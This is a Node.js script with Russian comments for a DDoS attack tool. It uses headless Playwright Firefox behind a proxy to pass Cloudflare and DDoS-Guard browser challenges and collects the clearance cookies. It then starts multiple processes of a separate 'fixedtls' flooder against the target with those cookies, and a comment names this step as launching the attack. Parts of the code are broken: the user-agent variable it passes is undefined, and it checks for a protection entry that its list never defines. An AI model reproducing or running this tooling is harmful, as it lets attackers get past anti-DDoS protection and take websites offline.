const playwright = require('playwright');
const colors = require('colors');
const { spawn } = require('child_process');
require('events').EventEmitter.defaultMaxListeners = Infinity;

const JSList = {
  js: [
    {
      name: "CloudFlare (Secure JS)",
      navigations: 2,
      locate: '<h2 class="h2" id="challenge-running">'
    },
    {
      name: "CloudFlare (Normal JS)",// незнаю на сколко хорошл sf работает
      navigations: 2,
      locate: '<div class="cf-browser-verification cf-im-under-attack">'
    },
    {
      name: "DDoS-Guard",
      navigations: 1,
      locate: 'document.getElementById("title").innerHTML="Проверка браузера перед переходом на сайт "+host;'
    },
    {
      name: "DDoS-Guard-en",
      navigations: 2,
      locate: 'document.getElementById("description").innerHTML="This process is automatic. Your browser will redirect to your requested content shortly.<br>Please allow up to 5 seconds...";' // найдите на странице что написанно и возьмите html код. Если будут фиксить 
    }
  ]
};

const ignoreNames = [
  "RequestError", "StatusCodeError", "CaptchaError",
  "CloudflareError", "ParseError", "ParserError",
  "TimeoutError", "DeprecationWarning"
];

const ignoreCodes = [
  "ECONNRESET", "ERR_ASSERTION", "ECONNREFUSED",
  "EPIPE", "EHOSTUNREACH", "ETIMEDOUT",
  "ESOCKETTIMEDOUT", "EPROTO", "DEP0123",
  "ERR_SSL_WRONG_VERSION_NUMBER", "NS_ERROR_CONNECTION_REFUSED"
];

// 🔁 Глобальные обработчики ошибок
process.on("uncaughtException", handleError);
process.on("unhandledRejection", handleError);
process.on("warning", handleError);
process.on("SIGHUP", () => 1);
process.on("SIGCHILD", () => 1);

function handleError(e) {
  if ((e.code && ignoreCodes.includes(e.code)) || (e.name && ignoreNames.includes(e.name))) return;
  console.warn(e);
}

// 🕓 Sleep
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// ⏱️ Логирование
function log(msg) {
  const now = new Date();
  const time = now.toTimeString().split(' ')[0];
  console.log(`(${time}) - ${msg}`);
}

// Рандом
const randomIntFromInterval = (min, max) =>
  Math.floor(Math.random() * (max - min + 1) + min);

// Cookies → строка
function cookiesToStr(cookies) {
  return cookies.map(({ name, value }) => `${name}=${value}`).join("; ");
}

// 🔍 Детект JS защиты
function JSDetection(html) {
  return JSList.js.find(({ locate }) => html.includes(locate));
}

// 🎯 Основная функция
async function solverInstance(args) {
  log(`(${`PlayWright`.cyan}) Запуск браузера.`);

  const browser = await playwright.firefox.launch({
    headless: true,
    proxy: {
      server: `http://${args.Proxy}`
    }
  });

  // 🎲 Рандом между ПК и iPhone
  function getRandomUAConfig() {
    const configs = [
      {
        name: 'Windows Chrome',
        userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        viewport: { width: 1920, height: 1080 },
        deviceScaleFactor: 1,
        isMobile: false,
        hasTouch: false
      },
      {
        name: 'iPhone Safari',
        userAgent: 'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1',
        viewport: { width: 390, height: 844 },
        deviceScaleFactor: 3,
        isMobile: true,
        hasTouch: true
      }
    ];
    return configs[Math.floor(Math.random() * configs.length)];
  }

  const uaConfig = getRandomUAConfig();
  log(`(${`UA`.cyan}) Используется профиль: ${uaConfig.name.green}`);

  const context = await browser.newContext({
    userAgent: uaConfig.userAgent,
    viewport: uaConfig.viewport,
    deviceScaleFactor: uaConfig.deviceScaleFactor,
    isMobile: uaConfig.isMobile,
    hasTouch: uaConfig.hasTouch
  });

  const page = await context.newPage();

  try {
    await page.goto(args.Target);
  } catch (e) {
    await browser.close();
    throw e;
  }

  log(`(${`PlayWright`.cyan}) UA: ${uaConfig.userAgent.green}`);

  // Первая проверка
  await processProtection(page, 'JSDetect [1/2]');

  //  Повторная проверка 
  await processProtection(page, 'JSDetect [2/2]');

  const cookies = cookiesToStr(await page.context().cookies());
  const title = await page.title();

  log(`(${`Harvester`.green}) Заголовок: ${title}`);
  log(`(${`Harvester`.green}) Cookies: ${cookies.yellow}`);

// Запуск атаки, самописный tls можно лучше, через неделю скину нормальный.
  for (let i = 0; i < args.Threads; i++) {
    spawn('./fixedtls', [args.Target, ua, args.Time, cookies, args.Method, args.Rate, args.Proxy]);
  }

  log(`(${`PlayWright`.green}) Сессия решена.`);
  await browser.close();
  return cookies;
}

// 🔧 Обработка защиты
async function processProtection(page, label) {
  const html = await page.content();
  const title = await page.title();

  if (title === "Access denied") {
    log(`(${label.red}) Доступ к странице запрещён.`);
    return;
  }

  const detected = JSDetection(html);
  if (detected) {
    log(`(${label.green}) защита: ${detected.name.yellow}`);

    if (detected.name === "VShield") {
      for (let i = 0; i < 5; i++) {
        await page.mouse.move(randomIntFromInterval(0, 100), randomIntFromInterval(0, 100));
      }
      await page.mouse.down();
      await page.mouse.move(100, 100);
      await page.mouse.up();
    }

    for (let i = 0; i < detected.navigations; i++) {
      await page.waitForNavigation();
      log(`(${`Навигация`.green}) [${i + 1}/${detected.navigations}]`);
    }
  } else {
    log(`(${label}) JS-защита не обнаружена.`);
  }
}

module.exports = {
  solverInstance
};